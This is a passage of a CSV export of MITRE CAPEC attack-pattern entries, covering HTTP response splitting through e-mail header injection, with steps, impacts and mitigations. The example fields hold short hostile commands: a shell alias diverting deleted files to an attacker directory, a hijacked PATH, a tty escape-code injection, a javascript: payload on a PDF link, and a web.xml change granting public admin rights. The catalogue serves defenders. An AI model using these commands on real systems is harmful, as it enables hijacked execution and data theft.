headers (e.g., browser cookies like Set-Cookie or Ajax web/browser object parameters like XMLHttpRequest) adversary chosen encoding (e.g., UTF-7) to utilize additional special characters (e.g., > and <) filtered by the target HTTP agent. Note that certain special characters and character encoding may be applicable only to intermediary and front-end agents with rare configurations or that are not RFC compliant.:TECHNIQUE:Follow an unrecognized (sometimes a RFC compliant) HTTP header with a subsequent HTTP request to potentially cause the HTTP request to be ignored and interpreted as part of the preceding HTTP request.::STEP:1:PHASE:Exploit:DESCRIPTION:[Perform HTTP Response Splitting attack] Using knowledge discovered in the experiment section above, smuggle a message to cause one of the consequences.TECHNIQUE:Leverage techniques identified in the Experiment Phase.::","::A vulnerable or compromised server or domain/site capable of allowing adversary to insert/inject malicious content that will appear in the server's response to target HTTP agents (e.g., proxies and users' web browsers).::Differences in the way the two HTTP agents parse and interpret HTTP requests and its headers.::HTTP headers capable of being user-manipulated.::HTTP agents running on HTTP/1.0 or HTTP/1.1 that allow for Keep Alive mode, Pipelined queries, and Chunked queries and responses.::","::SKILL:Detailed knowledge on HTTP protocol: request and response messages structure and usage of specific headers.:LEVEL:Medium::SKILL:Detailed knowledge on how specific HTTP agents receive, send, process, interpret, and parse a variety of HTTP messages and headers.:LEVEL:Medium::SKILL:Possess knowledge on the exact details in the discrepancies between several targeted HTTP agents in path of an HTTP message in parsing its message structure and individual headers.:LEVEL:Medium::","::Tools capable of monitoring HTTP messages, and crafting malicious HTTP messages and/or injecting malicious content into HTTP messages.::",::Differences in responses processed by the two agents with multiple responses to a single request in the web logs. This requires careful monitoring or a capable log analysis tool.::,::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::,::Design: evaluate HTTP agents prior to deployment for parsing/interpretation discrepancies.::Configuration: front-end HTTP agents notice ambiguous requests.::Configuration: back-end HTTP agents reject ambiguous requests and close the network connection.::Configuration: Disable reuse of back-end connections.::Configuration: Use HTTP/2 for back-end connections.::Configuration: Use the same web server software for front-end and back-end server.::Implementation: Utilize a Web Application Firewall (WAF) that has built-in mitigation to detect abnormal requests/responses.::Configuration: Install latest vendor security patches available for both intermediary and back-end HTTP infrastructure (i.e. proxies and web servers)::Configuration: Ensure that HTTP infrastructure in the chain or network path utilize a strict uniform parsing process.::Implementation: Utilize intermediary HTTP infrastructure capable of filtering and/or sanitizing user-input.::,"::In the PHP 5 session extension mechanism, a user-supplied session ID is sent back to the user within the Set-Cookie HTTP header. Since the contents of the user-supplied session ID are not validated, it is possible to inject arbitrary HTTP headers into the response body. This immediately enables HTTP Response Splitting by simply terminating the HTTP response header from within the session ID used in the Set-Cookie directive. See also: CVE-2006-0207::",::74::113::138::436::,TAXONOMY NAME:WASC:ENTRY ID:25:ENTRY NAME:HTTP Response Splitting::,TYPE:Terminology:NOTE:HTTP Splitting – the act of forcing a sender of (HTTP) messages to emit data stream consisting of more messages than the sender’s intension. The messages sent are 100% valid and RFC compliant [REF-117].::::TYPE:Terminology:NOTE:HTTP Smuggling – the act of forcing a sender of (HTTP) messages to emit data stream which may be parsed as a different set of messages (i.e. dislocated message boundaries) than the sender’s intention. This is done by virtue of forcing the sender to emit non-standard messages which can be interpreted in more than one way [REF-117].::::TYPE:Relationship:NOTE:HTTP Smuggling is an evolution of previous HTTP Splitting techniques which are commonly remediated against.::,https://capec.mitre.org/data/definitions/34.html
CAPEC-35,Leverage Executable Code in Non-Executable Files,Detailed,Draft,An attack of this type exploits a system's trust in configuration and resource files. When the executable loads the resource (such as an image file or configuration file) the attacker has modified the file to either execute malicious code directly or manipulate the target process (e.g. application server) to execute based on the malicious configuration parameters. Since systems are increasingly interrelated mashing up resources from local and remote sources the possibility of this attack occurring is high.,N/A,High,Very High,::NATURE:ChildOf:CAPEC ID:636::NATURE:PeerOf:CAPEC ID:23::NATURE:PeerOf:CAPEC ID:75::,N/A,::The attacker must have the ability to modify non-executable files consumed by the target software.::,::SKILL:To identify and execute against an over-privileged system interface:LEVEL:Low::,"::Ability to communicate synchronously or asynchronously with server that publishes an over-privileged directory, program, or interface. Optionally, ability to capture output directly through synchronous communication or other method such as FTP.::",N/A,::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::,"::Design: Enforce principle of least privilege::Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.::Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.::Implementation: Implement host integrity monitoring to detect any unwanted altering of configuration files.::Implementation: Ensure that files that are not required to execute, such as configuration files, are not over-privileged, i.e. not allowed to execute.::","::Virtually any system that relies on configuration files for runtime behavior is open to this attack vector. The configuration files are frequently stored in predictable locations, so an attacker that can fingerprint a server process such as a web server or database server can quickly identify the likely locale where the configuration is stored. And this is of course not limited to server processes. Unix shells rely on profile files to store environment variables, search paths for programs and so on. If the aliases are changed, then a standard Unix cp command can be rerouted to rm or other standard command so the user's intention is subverted.::The attack can be directed at a client system, such as causing buffer overrun through loading seemingly benign image files, as in Microsoft Security Bulletin MS04-028 where specially crafted JPEG files could cause a buffer overrun once loaded into the browser.::Another example targets clients reading pdf files. In this case the attacker simply appends javascript to the end of a legitimate url for a pdf (http://www.gnucitizen.org/blog/danger-danger-danger/) http://path/to/pdf/file.pdf#whatever_name_you_want=javascript:your_code_here The client assumes that they are reading a pdf, but the attacker has modified the resource and loaded executable javascript into the client's browser process.::The attack can also target server processes. The attacker edits the resource or configuration file, for example a web.xml file used to configure security permissions for a J2EE app server, adding role name public grants all users with the public role the ability to use the administration functionality. < security-constraint><description>Security processing rules for admin screens</description><url-pattern>/admin/*</url-pattern><http-method>POST</http-method><http-method>GET</http-method><auth-constraint><role-name>administrator</role-name><role-name>public</role-name> </auth-constraint> </security-constraint> The server trusts its configuration file to be correct, but when they are manipulated, the attacker gains full control.::",::94::96::95::97::272::59::282::270::,N/A,N/A,https://capec.mitre.org/data/definitions/35.html
CAPEC-36,Using Unpublished Interfaces,Standard,Draft,An adversary searches for and invokes interfaces that the target system designers did not intend to be publicly available. If these interfaces fail to authenticate requests the attacker may be able to invoke functionality they are not authorized for.,N/A,Medium,High,::NATURE:ChildOf:CAPEC ID:113::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify services] Discover a service of interest by exploring service registry listings or by connecting on a known port or some similar means.TECHNIQUE:Search via internet for known, published services.:TECHNIQUE:Use automated tools to scan known ports to identify internet-enabled services.:TECHNIQUE:Dump the code from the chip and then perform reverse engineering to analyze the code.::STEP:2:PHASE:Explore:DESCRIPTION:[Authenticate to service] Authenticate to the service, if required, in order to explore it.TECHNIQUE:Use published credentials to access system.:TECHNIQUE:Find unpublished credentails to access service.:TECHNIQUE:Use other attack pattern or weakness to bypass authentication.::STEP:3:PHASE:Explore:DESCRIPTION:[Identify all interfaces] Determine the exposed interfaces by querying the registry as well as probably sniffing to expose interfaces that are not explicitly listed.TECHNIQUE:For any published services, determine exposed interfaces via the documentation provided.:TECHNIQUE:For any services found, use error messages from poorly formed service calls to determine valid interfaces. In some cases, services will respond to poorly formed calls with valid ones.::STEP:4:PHASE:Experiment:DESCRIPTION:[Attempt to discover unpublished functions] Using manual or automated means, discover unpublished or undocumented functions exposed by the service.TECHNIQUE:Manually attempt calls to the service using an educated guess approach, including the use of terms like' 'test', 'debug', 'delete', etc.:TECHNIQUE:Use automated tools to scan the service to attempt to reverse engineer exposed, but undocumented, features.::STEP:5:PHASE:Exploit:DESCRIPTION:[Exploit unpublished functions] Using information determined via experimentation, exploit the unpublished features of the service.TECHNIQUE:Execute features that are not intended to be used by general system users.:TECHNIQUE:Craft malicious calls to features not intended to be used by general system users that take advantage of security flaws found in the functions.::","::The architecture under attack must publish or otherwise make available services that clients can attach to, either in an unauthenticated fashion, or having obtained an authentication token elsewhere. The service need not be 'discoverable', but in the event it isn't it must have some way of being discovered by an attacker. This might include listening on a well-known port. Ultimately, the likelihood of exploit depends on discoverability of the vulnerable service.::","::SKILL:A number of web service digging tools are available for free that help discover exposed web services and their interfaces. In the event that a web service is not listed, the attacker does not need to know much more in addition to the format of web service messages that they can sniff/monitor for.:LEVEL:Low::",::None: No specialized resources are required to execute this type of attack. Web service digging tools may be helpful.::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::,"::Authenticating both services and their discovery, and protecting that authentication mechanism simply fixes the bulk of this problem. Protecting the authentication involves the standard means, including: 1) protecting the channel over which authentication occurs, 2) preventing the theft, forgery, or prediction of authentication credentials or the resultant tokens, or 3) subversion of password reset and the like.::","::To an extent, Google services (such as Google Maps) are all well-known examples. Calling these services, or extending them for one's own (perhaps very different) purposes is as easy as knowing they exist. Their unencumbered public use, however, is a purposeful aspect of Google's business model. Most organizations, however, do not have the same business model. Organizations publishing services usually fall back on thoughts that Attackers will not know services exist and that even if they did, they wouldn't be able to access them because they're not on the local LAN. Simple threat modeling exercises usually uncovers simple attack vectors that can invalidate these assumptions.::",::306::693::695::1242::,N/A,N/A,https://capec.mitre.org/data/definitions/36.html
CAPEC-37,Retrieve Embedded Sensitive Data,Detailed,Draft,"An attacker examines a target system to find sensitive data that has been embedded within it. This information can reveal confidential contents, such as account numbers or individual keys/credentials that can be used as an intermediate step in a larger attack.",N/A,High,Very High,::NATURE:ChildOf:CAPEC ID:167::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify Target] Attacker identifies client components to extract information from. These may be binary executables, class files, shared libraries (e.g., DLLs), configuration files, or other system files.TECHNIQUE:Binary file extraction. The attacker extracts binary files from zips, jars, wars, PDFs or other composite formats.:TECHNIQUE:Package listing. The attacker uses a package manifest provided with the software installer, or the filesystem itself, to identify component files suitable for attack.::STEP:2:PHASE:Exploit:DESCRIPTION:[Retrieve Embedded Data] The attacker then uses a variety of techniques, such as sniffing, reverse-engineering, and cryptanalysis to retrieve the information of interest.TECHNIQUE:API Profiling. The attacker monitors the software's use of registry keys or other operating system-provided storage locations that can contain sensitive information.:TECHNIQUE:Execution in simulator. The attacker physically removes mass storage from the system and explores it using a simulator, external system, or other debugging harness.:TECHNIQUE:Common decoding methods. The attacker applies methods to decode such encodings and compressions as Base64, unzip, unrar, RLE decoding, gzip decompression and so on.:TECHNIQUE:Common data typing. The attacker looks for common file signatures for well-known file types (JPEG, TIFF, ASN.1, LDIF, etc.). If the signatures match, they attempt decoding in that format.::","::In order to feasibly execute this type of attack, some valuable data must be present in client software.::Additionally, this information must be unprotected, or protected in a flawed fashion, or through a mechanism that fails to resist reverse engineering, statistical, or other attack.::",::SKILL:The attacker must possess knowledge of client code structure as well as ability to reverse-engineer or decompile it or probe it in other ways. This knowledge is specific to the technology and language used for the client distribution:LEVEL:Medium::,"::The attacker must possess access to the system or code being exploited. Such access, for this set of attacks, will likely be physical. The attacker will make use of reverse engineering technologies, perhaps for data or to extract functionality from the binary. Such tool use may be as simple as Strings or a hex editor. Removing functionality may require the use of only a hex editor, or may require aspects of the toolchain used to construct the application: for instance the Adobe Flash development environment. Attacks of this nature do not require network access or undue CPU, memory, or other hardware-based resources.::",N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::,N/A,"::Using a tool such as 'strings' or similar to pull out text data, perhaps part of a database table, that extends beyond what a particular user's purview should be.::An attacker can also use a decompiler to decompile a downloaded Java applet in order to look for information such as hardcoded IP addresses, file paths, passwords or other such contents.::Attacker uses a tool such as a browser plug-in to pull cookie or other token information that, from a previous user at the same machine (perhaps a kiosk), allows the attacker to log in as the previous user.::",::226::311::525::312::314::315::318::1239::1258::1266::1272::1278::1301::1330::,TAXONOMY NAME:ATTACK:ENTRY ID:1552.004:ENTRY NAME:Unsecured Credentials:Private Keys::,N/A,https://capec.mitre.org/data/definitions/37.html
CAPEC-38,Leveraging/Manipulating Configuration File Search Paths,Detailed,Draft,"This pattern of attack sees an adversary load a malicious resource into a program's standard path so that when a known command is executed then the system instead executes the malicious component. The adversary can either modify the search path a program uses, like a PATH variable or classpath, or they can manipulate resources on the path to point to their malicious components. J2EE applications and other component based applications that are built from multiple binaries can have very long list of dependencies to execute. If one of these libraries and/or references is controllable by the attacker then application controls can be circumvented by the attacker.",N/A,High,Very High,::NATURE:ChildOf:CAPEC ID:159::,N/A,::The attacker must be able to write to redirect search paths on the victim host.::,::SKILL:To identify and execute against an over-privileged system interface:LEVEL:Low::,N/A,N/A,::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::,"::Design: Enforce principle of least privilege::Design: Ensure that the program's compound parts, including all system dependencies, classpath, path, and so on, are secured to the same or higher level assurance as the program::Implementation: Host integrity monitoring::","::Another method is to redirect commands by aliasing one legitimate command to another to create unexpected results. the Unix command rm could be aliased to mv and move all files the victim thinks they are deleting to a directory the attacker controls. In a Unix shell .profile setting alias rm=mv /usr/home/attacker In this case the attacker retains a copy of all the files the victim attempts to remove.::A standard UNIX path looks similar to this /bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin If the attacker modifies the path variable to point to a locale that includes malicious resources then the user unwittingly can execute commands on the attackers' behalf: /evildir/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin This is a form of usurping control of the program and the attack can be done on the classpath, database resources, or any other resources built from compound parts. At runtime detection and blocking of this attack is nearly impossible, because the configuration allows execution.::",::426::427::,TAXONOMY NAME:ATTACK:ENTRY ID:1574.007:ENTRY NAME:Hijack Execution Flow:Path Interception by PATH Environment Variable::,N/A,https://capec.mitre.org/data/definitions/38.html
CAPEC-383,Harvesting Information via API Event Monitoring,Detailed,Draft,"An adversary hosts an event within an application framework and then monitors the data exchanged during the course of the event for the purpose of harvesting any important data leaked during the transactions. One example could be harvesting lists of usernames or userIDs for the purpose of sending spam messages to those users. One example of this type of attack involves the adversary creating an event within the sub-application. Assume the adversary hosts a virtual sale of rare items. As other users enter the event, the attacker records via AiTM (CAPEC-94) proxy the user_ids and usernames of everyone who attends. The adversary would then be able to spam those users within the application using an automated script.",N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:407::,N/A,::The target software is utilizing application framework APIs::,N/A,N/A,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data The adversary is able to gather information to potentially support further nefarious activities.::,::Leverage encryption techniques during information transactions so as to protect them from attack patterns of this kind.::,N/A,::311::319::419::602::,N/A,N/A,https://capec.mitre.org/data/definitions/383.html
CAPEC-384,Application API Message Manipulation via Man-in-the-Middle,Standard,Draft,"An attacker manipulates either egress or ingress data from a client within an application framework in order to change the content of messages. Performing this attack can allow the attacker to gain unauthorized privileges within the application, or conduct attacks such as phishing, deceptive strategies to spread malware, or traditional web-application attacks. The techniques require use of specialized software that allow the attacker to perform adversary-in-the-middle (CAPEC-94) communications between the web browser and the remote system. Despite the use of AiTH software, the attack is actually directed at the server, as the client is one node in a series of content brokers that pass information along to the application framework. Additionally, it is not true Adversary-in-the-Middle attack at the network layer, but an application-layer attack the root cause of which is the master applications trust in the integrity of code supplied by the client.",N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:94::,N/A,::Targeted software is utilizing application framework APIs::,N/A,"::A software program that allows a user to man-in-the-middle communications between the client and server, such as a man-in-the-middle proxy.::",N/A,N/A,N/A,N/A,::471::345::346::602::311::,N/A,N/A,https://capec.mitre.org/data/definitions/384.html
CAPEC-385,Transaction or Event Tampering via Application API Manipulation,Detailed,Draft,"An attacker hosts or joins an event or transaction within an application framework in order to change the content of messages or items that are being exchanged. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that look authentic but may contain deceptive links, substitute one item or another, spoof an existing item and conduct a false exchange, or otherwise change the amounts or identity of what is being exchanged. The techniques require use of specialized software that allow the attacker to man-in-the-middle communications between the web browser and the remote system in order to change the content of various application elements. Often, items exchanged in game can be monetized via sales for coin, virtual dollars, etc. The purpose of the attack is for the attack to scam the victim by trapping the data packets involved the exchange and altering the integrity of the transfer process.",N/A,N/A,Medium,::NATURE:ChildOf:CAPEC ID:384::,N/A,::Targeted software is utilizing application framework APIs::,N/A,"::A software program that allows the use of adversary-in-the-middle communications (CAPEC-94) between the client and server, such as a man-in-the-middle proxy.::",N/A,N/A,N/A,N/A,::471::345::346::602::311::,N/A,N/A,https://capec.mitre.org/data/definitions/385.html
CAPEC-386,Application API Navigation Remapping,Standard,Draft,"An attacker manipulates either egress or ingress data from a client within an application framework in order to change the destination and/or content of links/buttons displayed to a user within API messages. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that looks authentic but contains links/buttons that point to an attacker controlled destination. Some applications make navigation remapping more difficult to detect because the actual HREF values of images, profile elements, and links/buttons are masked. One example would be to place an image in a user's photo gallery that when clicked upon redirected the user to an off-site location. Also, traditional web vulnerabilities (such as CSRF) can be constructed with remapped buttons or links. In some cases navigation remapping can be used for Phishing attacks or even means to artificially boost the page view, user site reputation, or click-fraud.",N/A,N/A,Medium,::NATURE:ChildOf:CAPEC ID:94::,N/A,::Targeted software is utilizing application framework APIs::,N/A,"::A software program that allows the use of adversary-in-the-middle (CAPEC-94) communications between the client and server, such as a man-in-the-middle proxy.::",N/A,N/A,N/A,N/A,::471::345::346::602::311::,N/A,N/A,https://capec.mitre.org/data/definitions/386.html
CAPEC-387,Navigation Remapping To Propagate Malicious Content,Detailed,Draft,"An attacker manipulates either egress or ingress data from a client within an application framework in order to change the content of messages and thereby circumvent the expected application logic. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that look authentic but may contain deceptive links, spam-like content, or links to the attackers' code. In general, content-spoofing within an application API can be employed to stage many different types of attacks varied based on the attackers' intent. When the goal is to spread malware, deceptive content is created such as modified links, buttons, or images, that entice users to click on those items, all of which point to a malicious URI. The techniques require use of specialized software that allow the attacker to use adversary-in-the-middle (CAPEC-94) communications between the web browser and the remote system in order to change the destination of various application interface elements.",N/A,N/A,Medium,::NATURE:ChildOf:CAPEC ID:386::,N/A,::Targeted software is utilizing application framework APIs::,N/A,"::A software program that allows the use of adversary-in-the-middle communications between the client and server, such as a man-in-the-middle proxy.::",N/A,N/A,N/A,N/A,::471::345::346::602::311::,N/A,N/A,https://capec.mitre.org/data/definitions/387.html
CAPEC-388,Application API Button Hijacking,Detailed,Draft,An attacker manipulates either egress or ingress data from a client within an application framework in order to change the destination and/or content of buttons displayed to a user within API messages. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that looks authentic but contains buttons that point to an attacker controlled destination.,N/A,N/A,Medium,::NATURE:ChildOf:CAPEC ID:386::,N/A,::Targeted software is utilizing application framework APIs::,N/A,"::A software program that allows the use of adversary-in-the-middle (CAPEC-94) communications between the client and server, such as a adversary-in-the-middle (CAPEC-94) proxy.::",N/A,N/A,N/A,"::An in-game event occurs and the attacker traps the result, which turns out to be a form that will be populated to their primary profile. The attacker, using a MITM proxy, observes the following data: [Button][Claim_Item]Sourdough_Cookie[URL_IMG]foo[/URL_IMG][Claim_Link]bar[/Claim_Link] By altering the destination of Claim_Link to point to the attackers' server an unwitting victim can be enticed to click the link. Another example would be for the attacker to rewrite the button destinations for an event so that clicking Yes or No causes the user to load the attackers' code.::",::471::345::346::602::311::,N/A,N/A,https://capec.mitre.org/data/definitions/388.html
CAPEC-39,Manipulating Opaque Client-based Data Tokens,Standard,Draft,"In circumstances where an application holds important data client-side in tokens (cookies, URLs, data files, and so forth) that data can be manipulated. If client or server-side application components reinterpret that data as authentication tokens or data (such as store item pricing or wallet information) then even opaquely manipulating that data may bear fruit for an Attacker. In this pattern an attacker undermines the assumption that client side tokens have been adequately protected from tampering through use of encryption or obfuscation.",N/A,High,Medium,::NATURE:ChildOf:CAPEC ID:22::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Enumerate information passed to client side] The attacker identifies the parameters used as part of tokens to take business or security decisionsTECHNIQUE:Use WebScarab to reveal hidden fields while browsing.:TECHNIQUE:Use a sniffer to capture packets:TECHNIQUE:View source of web page to find hidden fields:TECHNIQUE:Examine URL to see if any opaque tokens are in it:TECHNIQUE:Disassemble or decompile client-side application:TECHNIQUE:Use debugging tools such as File Monitor, Registry Monitor, Debuggers, etc.::STEP:2:PHASE:Explore:DESCRIPTION:[Determine protection mechanism for opaque token] The attacker determines the protection mechanism used to protect the confidentiality and integrity of these data tokens. They may be obfuscated or a full blown encryption may be used.TECHNIQUE:Look for signs of well-known character encodings:TECHNIQUE:Look for cryptographic signatures:TECHNIQUE:Look for delimiters or other indicators of structure::STEP:3:PHASE:Experiment:DESCRIPTION:[Modify parameter/token values] Trying each parameter in turn, the attacker modifies the valuesTECHNIQUE:Modify tokens logically:TECHNIQUE:Modify tokens arithmetically:TECHNIQUE:Modify tokens bitwise:TECHNIQUE:Modify structural components of tokens:TECHNIQUE:Modify order of parameters/tokens::STEP:4:PHASE:Experiment:DESCRIPTION:[Cycle through values for each parameter.] Depending on the nature of the application, the attacker now cycles through values of each parameter and observes the effects of this modification in the data returned by the serverTECHNIQUE:Use network-level packet injection tools such as netcat:TECHNIQUE:Use application-level data modification tools such as Tamper Data, WebScarab, TamperIE, etc.:TECHNIQUE:Use modified client (modified by reverse engineering):TECHNIQUE:Use debugging tools to modify data in client::","::An attacker already has some access to the system or can steal the client based data tokens from another user who has access to the system.::For an Attacker to viably execute this attack, some data (later interpreted by the application) must be held client-side in a way that can be manipulated without detection. This means that the data or tokens are not CRCd as part of their value or through a separate meta-data store elsewhere.::",::SKILL:If the client site token is obfuscated.:LEVEL:Medium::SKILL:If the client site token is encrypted.:LEVEL:High::,"::The Attacker needs no special hardware-based resources in order to conduct this attack. Software plugins, such as Tamper Data for Firefox, may help in manipulating URL- or cookie-based data.::",N/A,::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::,"::One solution to this problem is to protect encrypted data with a CRC of some sort. If knowing who last manipulated the data is important, then using a cryptographic message authentication code (or hMAC) is prescribed. However, this guidance is not a panacea. In particular, any value created by (and therefore encrypted by) the client, which itself is a malicious value, all the protective cryptography in the world can't make the value 'correct' again. Put simply, if the client has control over the whole process of generating and encoding the value, then simply protecting its integrity doesn't help.::Make sure to protect client side authentication tokens for confidentiality (encryption) and integrity (signed hash)::Make sure that all session tokens use a good source of randomness::Perform validation on the server side to make sure that client side data tokens are consistent with what is expected.::","::With certain price watching websites, that aggregate products available prices, the user can buy items through whichever vendors has product availability, the best price, or other differentiator. Once a user selects an item, the site must broker the purchase of that item with the vendor. Because vendors sell the same product through different channel partners at different prices, token exchange between price watching sites and selling vendors will often contain pricing information. With some price watching sites, manipulating URL-data (which is encrypted) even opaquely yields different prices charged by the fulfilling vendor. If the manipulated price turns out higher, the Attacker can cancel purchase. If the Attacker succeeded in manipulating the token and creating a lower price, they proceed.::Upon successful authentication user is granted an encrypted authentication cookie by the server and it is stored on the client. One piece of information stored in the authentication cookie reflects the access level of the user (e.g. u for user). The authentication cookie is encrypted using the Electronic Code Book (ECB) mode, that naively encrypts each of the plaintext blocks to each of the ciphertext blocks separately. An attacker knows the structure of the cookie and can figure out what bits (encrypted) store the information relating to the access level of the user. An attacker modifies the authentication cookie and effectively substitutes u for a by flipping some of the corresponding bits of ciphertext (trial and error). Once the correct flip is found, when the system is accessed, the attacker is granted administrative privileges in the system. Note that in this case an attacker did not have to figure out the exact encryption algorithm or find the secret key, but merely exploit the weakness inherent in using the ECB encryption mode.::Archangel Weblog 0.90.02 allows remote attackers to bypass authentication by setting the ba_admin cookie to 1. See also: CVE-2006-0944::",::353::285::302::472::565::315::539::384::233::,N/A,N/A,https://capec.mitre.org/data/definitions/39.html
CAPEC-40,Manipulating Writeable Terminal Devices,Standard,Draft,This attack exploits terminal devices that allow themselves to be written to by other users. The attacker sends command strings to the target terminal device hoping that the target user will hit enter and thereby execute the malicious command with their privileges. The attacker can send the results (such as copying /etc/passwd) to a known directory and collect once the attack has succeeded.,N/A,High,Very High,::NATURE:ChildOf:CAPEC ID:248::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify attacker-writable terminals] Determine if users TTYs are writable by the attacker.TECHNIQUE:Determine the permissions for the TTYs found on the system. Any that allow user write to the TTY may be vulnerable.:TECHNIQUE:Attempt to write to other user TTYs. This approach could leave a trail or alert a user.::STEP:2:PHASE:Exploit:DESCRIPTION:[Execute malicious commands] Using one or more vulnerable TTY, execute commands to achieve various impacts.TECHNIQUE:Commands that allow reading or writing end user files can be executed.::",::User terminals must have a permissive access control such as world writeable that allows normal users to control data on other user's terminals.::,"::SKILL:Ability to discover permissions on terminal devices. Of course, brute force can also be used.:LEVEL:Low::",::Access to a terminal on the target network::,N/A,::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::,::Design: Ensure that terminals are only writeable by named owner user and/or administrator::Design: Enforce principle of least privilege::,"::Any system that allows other peers to write directly to its terminal process is vulnerable to this type of attack. If the terminals are available through being over-privileged (i.e. world-writable) or the attacker is an administrator, then a series of commands in this format can be used to echo commands out to victim terminals. $echo -e 033[30m033132 > /dev/ttyXX where XX is the tty number of the user under attack. This will paste the characters to another terminal (tty). Note this technique works only if the victim's tty is world writable (which it may not be). That is one reason why programs like write(1) and talk(1) in UNIX systems need to run setuid. [REF-1] If the victim continues to hit enter and execute the commands, there are an endless supply of vectors available to the attacker, copying files, open up network connections, ftp out to servers, and so on.::",::77::,N/A,N/A,https://capec.mitre.org/data/definitions/40.html
CAPEC-402,Bypassing ATA Password Security,Detailed,Draft,"An adversary exploits a weakness in ATA security on a drive to gain access to the information the drive contains without supplying the proper credentials. ATA Security is often employed to protect hard disk information from unauthorized access. The mechanism requires the user to type in a password before the BIOS is allowed access to drive contents. Some implementations of ATA security will accept the ATA command to update the password without the user having authenticated with the BIOS. This occurs because the security mechanism assumes the user has first authenticated via the BIOS prior to sending commands to the drive. Various methods exist for exploiting this flaw, the most common being installing the ATA protected drive into a system lacking ATA security features (a.k.a. hot swapping). Once the drive is installed into the new system the BIOS can be used to reset the drive password.",N/A,N/A,N/A,::NATURE:ChildOf:CAPEC ID:401::,N/A,::Access to the system containing the ATA Drive so that the drive can be physically removed from the system.::,N/A,N/A,N/A,N/A,"::Avoid using ATA password security when possible.::Use full disk encryption to protect the entire contents of the drive or sensitive partitions on the drive.::Leverage third-party utilities that interface with self-encrypting drives (SEDs) to provide authentication, while relying on the SED itself for data encryption.::","::The A-FF Repair Station tool is a data recovery utility that can be used for ATA password removal (both High and Maximum level) and firmware area recovery. An adversary with access to this tool could reset the ATA password to bypass this security feature and unlock the hard drive. The adversary could then obtain any data contained within the drive. [REF-702]::An adversary gains physical access to the targeted hard drive and installs it into a system that does not support ATA security features. Once the drive is installed in the feature-lacking system, the adversary is able to reset the hard drive password via the BIOS. As a result, the adversary is able to bypass ATA password security and access content on the drive.::",::285::,N/A,N/A,https://capec.mitre.org/data/definitions/402.html
CAPEC-41,Using Meta-characters in E-mail Headers to Inject Malicious Payloads,Detailed,Draft,"This type of attack involves an attacker leveraging meta-characters in email headers to inject improper behavior into email programs. Email software has become increasingly sophisticated and feature-rich. In addition, email applications are ubiquitous and connected directly to the Web making them ideal targets to launch and propagate attacks. As the user demand for new functionality in email applications grows, they become more like browsers with complex rendering and plug in routines. As more email functionality is included and abstracted from the user, this creates opportunities for attackers. Virtually all email applications do not list email header information by default, however the email header contains valuable attacker vectors for the attacker to exploit particularly if the behavior of the email client application is known. Meta-characters are hidden from the user, but can contain scripts, enumerations, probes, and other attacks against the user's system.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:242::NATURE:ChildOf:CAPEC ID:134::,"::STEP:1:PHASE:Experiment:DESCRIPTION:[Identify and characterize metacharacter-processing vulnerabilities in email headers] An attacker creates emails with headers containing various metacharacter-based malicious payloads in order to determine whether the target application processes the malicious content and in what manner it does so.TECHNIQUE:Use an automated tool (fuzzer) to create malicious emails headers containing metacharacter-based payloads.:TECHNIQUE:Manually tampering email headers to inject malicious metacharacter-based payload content in them.::STEP:2:PHASE:Exploit:DESCRIPTION:An attacker leverages vulnerabilities identified during the Experiment Phase to inject malicious email headers and cause the targeted email application to exhibit behavior outside of its expected constraints.TECHNIQUE:Send emails with specifically-constructed, metacharacter-based malicious payloads in the email headers to targeted systems running email processing applications identified as vulnerable during the Experiment Phase.::","::This attack targets most widely deployed feature rich email applications, including web based email programs.::",::SKILL:To distribute 